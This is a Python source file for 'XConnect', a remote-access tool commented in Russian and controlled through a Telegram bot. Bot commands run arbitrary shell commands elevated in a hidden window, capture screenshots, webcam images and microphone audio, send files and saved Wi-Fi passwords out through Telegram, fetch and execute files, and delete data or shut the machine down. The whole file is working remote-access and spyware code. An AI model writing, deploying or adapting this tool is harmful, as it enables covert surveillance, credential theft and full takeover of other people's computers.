# XConnect BETA VERSION By Horgvards
# 1.0

import subprocess
import sys
import os
from hwid_manager import get_hwid, check_hwid

# Проверка аргумента командной строки
if len(sys.argv) < 2 or sys.argv[1] != "ВВЕДИТЕ HWID - ENTER HWID":
    print("Ошибка: Скрипт может быть запущен только через BAT-файл.")
    exit(1)

# Узнаем текущий HWID (для отладки)
current_hwid = get_hwid()
print("Текущий HWID:", current_hwid)

# Задаем разрешенный HWID
ALLOWED_HWID = current_hwid  # Используем текущий HWID как разрешенный

# Проверка HWID
if not check_hwid(ALLOWED_HWID):
    print("Ошибка: Неверный HWID. Скрипт не может быть запущен.")
    exit(1)

# Если все проверки пройдены, выполняется основной код
print("Проверки пройдены. Запуск основного скрипта...")

# Список необходимых библиотек
required_libraries = [
    "requests",
    "datetime",
    "customtkinter",
    "pyautogui",
    "psutil",
    "platform",
    "plyer",
    "cryptography",
    "pygame",  # Для воспроизведения аудио
    "opencv-python",  # Для работы с веб-камерой
    "numpy",
    "sounddevice",  # Для записи аудио
    "soundfile",    # Для сохранения аудио
    "webbrowser"    # Для открытия URL
]

def install_libraries():
    for lib in required_libraries:
        try:
            __import__(lib)  # Пробуем импортировать библиотеку
            print(f"Библиотека {lib} уже установлена.")
        except ImportError:
            print(f"Установка библиотеки: {lib}")
            subprocess.check_call([sys.executable, "-m", "pip", "install", lib])

# Устанавливаем библиотеки, если они отсутствуют
install_libraries()

# Импортируем библиотеки после установки
import threading
import socket
import time
import pyautogui
import psutil
import requests
import platform
from datetime import datetime
import tkinter as tk
import customtkinter as ctk
import cv2
import numpy as np
from plyer import notification
import pygame
import sounddevice as sd
import soundfile as sf
import webbrowser

# Конфигурация Telegram бота
TELEGRAM_BOT_TOKEN = "TELEGRAM_BOT_TOKEN"
TELEGRAM_CHAT_ID = "CHAT_ID"

class TelegramBot:
    @staticmethod
    def send_message(message):
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
        payload = {"chat_id": TELEGRAM_CHAT_ID, "text": message}
        try:
            response = requests.post(url, json=payload)
            response.raise_for_status()
        except requests.RequestException as e:
            print(f"Ошибка при отправке сообщения в Telegram: {e}")

    @staticmethod
    def send_photo(photo_path):
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendPhoto"
        with open(photo_path, 'rb') as photo:
            payload = {"chat_id": TELEGRAM_CHAT_ID}
            files = {"photo": photo}
            try:
                response = requests.post(url, data=payload, files=files)
                response.raise_for_status()
            except requests.RequestException as e:
                print(f"Ошибка при отправке фото в Telegram: {e}")

    @staticmethod
    def send_file(file_path):
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendDocument"
        with open(file_path, 'rb') as file:
            payload = {"chat_id": TELEGRAM_CHAT_ID}
            files = {"document": file}
            try:
                response = requests.post(url, data=payload, files=files)
                response.raise_for_status()
            except requests.RequestException as e:
                print(f"Ошибка при отправке файла в Telegram: {e}")

class SystemCommands:
    @staticmethod
    def execute_command_as_admin(command):
        if not command:
            return "Ошибка: Пустая команда."
        try:
            result = subprocess.run(
    ["powershell", "-Command", f"Start-Process cmd -ArgumentList '/c {command}' -Verb runAs -WindowStyle Hidden"],
    capture_output=True, text=True, encoding='cp1251', shell=True, creationflags=subprocess.CREATE_NO_WINDOW
    )
            return result.stdout.strip() or "Команда выполнена успешно." if result.returncode == 0 else result.stderr.strip() or "Ошибка при выполнении команды."
        except Exception as e:
            return f"Ошибка при выполнении команды: {e}"
            
    @staticmethod
    def disconnect_wifi():
        try:
            # Получаем имя Wi-Fi интерфейса
            result = subprocess.run(
                ["netsh", "wlan", "show", "interfaces"],
                capture_output=True, text=True, encoding='utf-8'
            )
            if result.returncode != 0 or not result.stdout:
                return "Ошибка: Не удалось получить информацию о Wi-Fi."

            if "SSID" in result.stdout:
                ssid = result.stdout.split("SSID")[1].split(":")[1].split("\n")[0].strip()
                # Отключаемся от Wi-Fi
                subprocess.run(
                    ["netsh", "wlan", "disconnect"],
                    capture_output=True, text=True, encoding='utf-8'
                )
                return f"Отключено от Wi-Fi: {ssid}"
            else:
                return "Wi-Fi не подключен."
        except Exception as e:
            return f"Ошибка: {e}"

    @staticmethod
    def take_screenshot():
        screenshot = pyautogui.screenshot()
        screenshot_path = "screenshot.png"
        screenshot.save(screenshot_path)
        return screenshot_path

    @staticmethod
    def get_system_info():
        cpu_usage = psutil.cpu_percent(interval=1)
        memory_info = psutil.virtual_memory()
        disk_usage = psutil.disk_usage('/')
        return (
            f"💻 Информация о системе:\n"
            f"🔧 Процессор: {cpu_usage}%\n"
            f"🧠 Память: {memory_info.percent}%\n"
            f"💾 Диск: {disk_usage.percent}%"
        )

    @staticmethod
    def list_files(directory):
        try:
            if not os.path.exists(directory):
                return f"Ошибка: Директория '{directory}' не существует."
            files = os.listdir(directory)
            return "\n".join(files) if files else f"Директория '{directory}' пуста."
        except Exception as e:
            return f"Ошибка при получении списка файлов: {e}"

    @staticmethod
    def download_file(file_path):
        try:
            if not os.path.exists(file_path):
                return f"Ошибка: Файл '{file_path}' не существует."
            TelegramBot.send_file(file_path)
            return f"Файл '{file_path}' успешно отправлен."
        except Exception as e:
            return f"Ошибка при отправке файла: {e}"

    @staticmethod
    def upload_file(file_id, save_path):
        try:
            url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/getFile"
            params = {"file_id": file_id}
            response = requests.get(url, params=params).json()

            if "result" not in response:
                return "Ошибка: Не удалось получить информацию о файле."

            file_path = response["result"]["file_path"]
            file_url = f"https://api.telegram.org/file/bot{TELEGRAM_BOT_TOKEN}/{file_path}"

            response = requests.get(file_url)
            with open(save_path, 'wb') as file:
                file.write(response.content)

            return f"Файл успешно загружен и сохранён как '{save_path}'."
        except Exception as e:
            return f"Ошибка при загрузке файла: {e}"

    @staticmethod
    def execute_file(file_path):
        try:
            if not os.path.exists(file_path):
                return f"Ошибка: Файл '{file_path}' не существует."
            os.startfile(file_path)
            return f"Файл '{file_path}' успешно запущен."
        except Exception as e:
            return f"Ошибка при выполнении файла: {e}"

    @staticmethod
    def kill_process(process_name):
        try:
            for proc in psutil.process_iter(['pid', 'name']):
                if proc.info['name'] == process_name:
                    proc.terminate()
                    return f"Процесс '{process_name}' завершён."
            return f"Процесс '{process_name}' не найден."
        except Exception as e:
            return f"Ошибка: {e}"

    @staticmethod
    def get_external_ip():
        try:
            response = requests.get("https://api.ipify.org?format=json")
            ip = response.json()["ip"]
            return f"Внешний IP: {ip}"
        except Exception as e:
            return f"Ошибка: {e}"

    @staticmethod
    def get_wifi_info():
        try:
            result = subprocess.run(
                ["netsh", "wlan", "show", "interfaces"],
                capture_output=True, text=True, encoding='utf-8'
            )
            if result.returncode != 0 or not result.stdout:
                return "Ошибка: Не удалось получить информацию о Wi-Fi."

            if "SSID" in result.stdout:
                ssid = result.stdout.split("SSID")[1].split(":")[1].split("\n")[0].strip()
                result = subprocess.run(
                    ["netsh", "wlan", "show", "profile", ssid, "key=clear"],
                    capture_output=True, text=True, encoding='utf-8'
                )
                if result.returncode != 0 or not result.stdout:
                    return f"Wi-Fi: {ssid}\nПароль: Не удалось получить."

                if "Key Content" in result.stdout:
                    password = result.stdout.split("Key Content")[1].split(":")[1].split("\n")[0].strip()
                    return f"Wi-Fi: {ssid}\nПароль: {password}"
                else:
                    return f"Wi-Fi: {ssid}\nПароль: Не удалось получить (пароль не сохранён или недоступен)."
            else:
                return "Wi-Fi не подключен."
        except Exception as e:
            return f"Ошибка: {e}"

    @staticmethod
    def shutdown_computer():
        try:
            os.system("shutdown /s /t 1")
            return "Компьютер выключается..."
        except Exception as e:
            return f"Ошибка: {e}"

    @staticmethod
    def restart_computer():
        try:
            os.system("shutdown /r /t 1")
            return "Компьютер перезагружается..."
        except Exception as e:
            return f"Ошибка: {e}"

    @staticmethod
    def sleep_computer():
        try:
            os.system("rundll32.exe powrprof.dll,SetSuspendState 0,1,0")
            return "Компьютер переходит в спящий режим..."
        except Exception as e:
            return f"Ошибка: {e}"

    @staticmethod
    def create_folder(path):
        try:
            if not path:
                return "Ошибка: Путь не указан."
            os.makedirs(path, exist_ok=True)
            return f"Папка '{path}' успешно создана."
        except Exception as e:
            return f"Ошибка при создании папки: {e}"

    @staticmethod
    def delete_path(path):
        try:
            if os.path.isfile(path):
                os.remove(path)
                return f"Файл '{path}' удалён."
            elif os.path.isdir(path):
                os.rmdir(path)
                return f"Папка '{path}' удалена."
            else:
                return f"Ошибка: '{path}' не существует."
        except Exception as e:
            return f"Ошибка: {e}"

    @staticmethod
    def capture_webcam():
        try:
            cap = cv2.VideoCapture(0)
            ret, frame = cap.read()
            if ret:
                cv2.imwrite("webcam.jpg", frame)
                cap.release()
                return "webcam.jpg"
            else:
                return "Ошибка: Не удалось получить изображение с веб-камеры."
        except Exception as e:
            return f"Ошибка: {e}"

    @staticmethod
    def play_audio(file_path):
        try:
            pygame.mixer.init()
            pygame.mixer.music.load(file_path)
            pygame.mixer.music.play()
            return f"Аудио '{file_path}' воспроизводится."
        except Exception as e:
            return f"Ошибка: {e}"

    @staticmethod
    def stop_audio():
        try:
            pygame.mixer.music.stop()
            return "Воспроизведение аудио остановлено."
        except Exception as e:
            return f"Ошибка: {e}"

    @staticmethod
    def record_audio(duration):
        try:
            sample_rate = 44100
            channels = 2
            print(f"Запись аудио в течение {duration} секунд...")
            audio_data = sd.rec(int(duration * sample_rate), samplerate=sample_rate, channels=channels)
            sd.wait()
            file_path = "recorded_audio.wav"
            sf.write(file_path, audio_data, sample_rate)
            return file_path
        except ImportError:
            return "Установите библиотеки sounddevice и soundfile: pip install sounddevice soundfile"
        except Exception as e:
            return f"Ошибка при записи аудио: {e}"

    @staticmethod
    def open_url(url):
        try:
            webbrowser.open(url)
            return f"URL '{url}' успешно открыт в браузере."
        except Exception as e:
            return f"Ошибка: {e}"

    @staticmethod
    def send_notification(message):
        try:
            notification.notify(
                title="XConnect",
                message=message,
                timeout=10
            )
            return f"Уведомление отправлено: {message}"
        except Exception as e:
            return f"Ошибка: {e}"

def handle_telegram_commands():
    last_update_id = 0
    while True:
        try:
            url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/getUpdates"
            params = {"offset": last_update_id + 1, "timeout": 10}
            response = requests.get(url, params=params).json()

            if "result" in response:
                for update in response["result"]:
                    last_update_id = update["update_id"]
                    message = update.get("message", {}).get("text", "").strip()

                    if message.startswith("/cmd"):
                        command = message[len("/cmd"):].strip()
                        if not command:
                            TelegramBot.send_message("Ошибка: Команда не указана.")
                            continue

                        if command.lower() in ["exit", "quit"]:
                            TelegramBot.send_message("Завершение удалённого доступа...")
                            os._exit(0)

                        output = SystemCommands.execute_command_as_admin(command)
                        TelegramBot.send_message(f"Результат выполнения команды:\n{output}")

                    elif message.startswith("/help"):
                        help_message = (
                            "Доступные команды:\n"
                            "/cmd <команда> - выполнить команду на удалённом компьютере.\n"
                            "/screenshot - сделать скриншот экрана.\n"
                            "/sysinfo - получить информацию о системе.\n"
                            "/files <директория> - получить список файлов в директории.\n"
                            "/download <путь_к_файлу> - скачать файл с компьютера.\n"
                            "/upload - загрузить файл на компьютер (ответьте на это сообщение файлом).\n"
                            "/exec <путь_к_файлу> - выполнить файл на компьютере.\n"
                            "/kill <имя процесса> - завершить процесс.\n"
                            "/ip - показать внешний IP.\n"
                            "/wifi - показать информацию о Wi-Fi.\n"
                            "/disconnectwifi - отключить Wi-Fi на устройстве.\n"
                            "/shutdown - выключить компьютер.\n"
                            "/restart - перезагрузить компьютер.\n"
                            "/sleep - перевести компьютер в спящий режим.\n"
                            "/create_folder <путь> - создать папку.\n"
                            "/delete <путь> - удалить файл или папку.\n"
                            "/webcam - сделать снимок с веб-камеры.\n"
                            "/play <путь> - воспроизвести аудио.\n"
                            "/stopaudio - остановить воспроизведение аудио.\n"
                            "/notify <текст> - отправить уведомление на экран.\n"
                            "/recordaudio <длительность> - записать аудио.\n"
                            "/openurl <URL> - открыть URL в браузере.\n"
                            "/help - показать это сообщение."
                        )
                        TelegramBot.send_message(help_message)

                    elif message.startswith("/screenshot"):
                        screenshot_path = SystemCommands.take_screenshot()
                        TelegramBot.send_photo(screenshot_path)
                        os.remove(screenshot_path)

                    elif message.startswith("/sysinfo"):
                        system_info = SystemCommands.get_system_info()
                        TelegramBot.send_message(system_info)

                    elif message.startswith("/files"):
                        directory = message[len("/files"):].strip()
                        if not directory:
                            TelegramBot.send_message("Ошибка: Директория не указана.")
                            continue

                        files_list = SystemCommands.list_files(directory)
                        TelegramBot.send_message(f"Файлы в директории '{directory}':\n{files_list}")

                    elif message.startswith("/download"):
                        file_path = message[len("/download"):].strip()
                        if not file_path:
                            TelegramBot.send_message("Ошибка: Путь к файлу не указан.")
                            continue

                        result = SystemCommands.download_file(file_path)
                        TelegramBot.send_message(result)

                    elif message.startswith("/upload"):
                        TelegramBot.send_message("Пожалуйста, отправьте файл в ответ на это сообщение.")

                    elif message.startswith("/exec"):
                        file_path = message[len("/exec"):].strip()
                        if not file_path:
                            TelegramBot.send_message("Ошибка: Путь к файлу не указан.")
                            continue

                        result = SystemCommands.execute_file(file_path)
                        TelegramBot.send_message(result)

                    elif message.startswith("/kill"):
                        process_name = message[len("/kill"):].strip()
                        if not process_name:
                            TelegramBot.send_message("Ошибка: Имя процесса не указано.")
                            continue

                        result = SystemCommands.kill_process(process_name)
                        TelegramBot.send_message(result)

                    elif message.startswith("/ip"):
                        result = SystemCommands.get_external_ip()
                        TelegramBot.send_message(result)

                    elif message.startswith("/wifi"):
                        result = SystemCommands.get_wifi_info()
                        TelegramBot.send_message(result)

                    elif message.startswith("/shutdown"):
                        result = SystemCommands.shutdown_computer()
                        TelegramBot.send_message(result)

                    elif message.startswith("/restart"):
                        result = SystemCommands.restart_computer()
                        TelegramBot.send_message(result)

                    elif message.startswith("/sleep"):
                        result = SystemCommands.sleep_computer()
                        TelegramBot.send_message(result)

                    elif message.startswith("/create_folder"):
                        path = message[len("/create_folder"):].strip()
                        if not path:
                            TelegramBot.send_message("Ошибка: Путь не указан.")
                            continue

                        result = SystemCommands.create_folder(path)
                        TelegramBot.send_message(result)

                    elif message.startswith("/delete"):
                        path = message[len("/delete"):].strip()
                        if not path:
                            TelegramBot.send_message("Ошибка: Путь не указан.")
                            continue

                        result = SystemCommands.delete_path(path)
                        TelegramBot.send_message(result)

                    elif message.startswith("/webcam"):
                        result = SystemCommands.capture_webcam()
                        if result.endswith(".jpg"):
                            TelegramBot.send_photo(result)
                            os.remove(result)
                        else:
                            TelegramBot.send_message(result)

                    elif message.startswith("/play"):
                        file_path = message[len("/play"):].strip()
                        if not file_path:
                            TelegramBot.send_message("Ошибка: Путь к аудиофайлу не указан.")
                            continue

                        result = SystemCommands.play_audio(file_path)
                        TelegramBot.send_message(result)

                    elif message.startswith("/stopaudio"):
                        result = SystemCommands.stop_audio()
                        TelegramBot.send_message(result)

                    elif message.startswith("/notify"):
                        text = message[len("/notify"):].strip()
                        if not text:
                            TelegramBot.send_message("Ошибка: Текст уведомления не указан.")
                            continue

                        result = SystemCommands.send_notification(text)
                        TelegramBot.send_message(result)
                        
                    elif message.startswith("/disconnectwifi"):
                        result = SystemCommands.disconnect_wifi()
                        TelegramBot.send_message(result)

                    elif message.startswith("/recordaudio"):
                        try:
                            duration = int(message[len("/recordaudio"):].strip())
                            if duration <= 0:
                                TelegramBot.send_message("Ошибка: Длительность записи должна быть больше 0 секунд.")
                                continue

                            result = SystemCommands.record_audio(duration)
                            if result.endswith(".wav"):
                                TelegramBot.send_file(result)
                                os.remove(result)
                            else:
                                TelegramBot.send_message(result)
                        except ValueError:
                            TelegramBot.send_message("Ошибка: Укажите длительность записи в секундах (например, /recordaudio 10).")

                    elif message.startswith("/openurl"):
                        url = message[len("/openurl"):].strip()
                        if not url:
                            TelegramBot.send_message("Ошибка: URL не указан.")
                            continue

                        result = SystemCommands.open_url(url)
                        TelegramBot.send_message(result)

                    elif "document" in update.get("message", {}):
                        file_id = update["message"]["document"]["file_id"]
                        file_name = update["message"]["document"]["file_name"]
                        save_path = os.path.join(os.getcwd(), file_name)
                        result = SystemCommands.upload_file(file_id, save_path)
                        TelegramBot.send_message(result)

                    elif "audio" in update.get("message", {}):
                        file_id = update["message"]["audio"]["file_id"]
                        file_name = update["message"]["audio"]["file_name"]
                        save_path = os.path.join(os.getcwd(), file_name)
                        result = SystemCommands.upload_file(file_id, save_path)
                        TelegramBot.send_message(result)

                    elif "voice" in update.get("message", {}):
                        file_id = update["message"]["voice"]["file_id"]
                        file_name = "voice_message.ogg"
                        save_path = os.path.join(os.getcwd(), file_name)
                        result = SystemCommands.upload_file(file_id, save_path)
                        TelegramBot.send_message(result)

                    elif "photo" in update.get("message", {}):
                        file_id = update["message"]["photo"][-1]["file_id"]
                        file_name = "photo.jpg"
                        save_path = os.path.join(os.getcwd(), file_name)
                        result = SystemCommands.upload_file(file_id, save_path)
                        TelegramBot.send_message(result)

        except requests.RequestException as e:
            print(f"Ошибка при запросе к Telegram API: {e}")
            time.sleep(5)
        except Exception as e:
            print(f"Неизвестная ошибка: {e}")
            time.sleep(5)

def start_connection():
    TelegramBot.send_message("🚀 Подключение установлено.")
    global telegram_thread
    telegram_thread = threading.Thread(target=handle_telegram_commands, daemon=True)
    telegram_thread.start()
    start_button.configure(state=tk.DISABLED)
    stop_button.configure(state=tk.NORMAL)

def stop_connection():
    TelegramBot.send_message("🔴 Подключение завершено.")
    stop_button.configure(state=tk.DISABLED)
    start_button.configure(state=tk.NORMAL)

def create_gui():
    ctk.set_appearance_mode("System")
    ctk.set_default_color_theme("blue")

    app = ctk.CTk()
    app.title("XConnect")
    app.geometry("300x150")

    global start_button, stop_button
    start_button = ctk.CTkButton(app, text="Подключиться", command=start_connection)
    start_button.pack(pady=20)

    stop_button = ctk.CTkButton(app, text="Отключиться", command=stop_connection, state=tk.DISABLED)
    stop_button.pack(pady=20)

    app.mainloop()

if __name__ == "__main__":
    create_gui()